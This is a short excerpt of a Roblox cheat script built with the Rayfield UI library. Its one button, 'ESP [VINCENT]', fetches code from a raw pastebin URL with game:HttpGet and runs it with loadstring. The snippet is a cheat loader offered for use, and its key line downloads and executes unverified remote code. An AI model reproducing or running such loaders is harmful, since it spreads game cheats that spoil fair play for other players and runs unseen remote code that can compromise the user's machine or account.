...
local Window = Rayfield:CreateWindow({
   ...
   Icon = 75117037339500, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
...
local Button = MAINTab:CreateButton({
   Name = "ESP [VINCENT]",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/6C0jwcHf"))()  
   end,
})
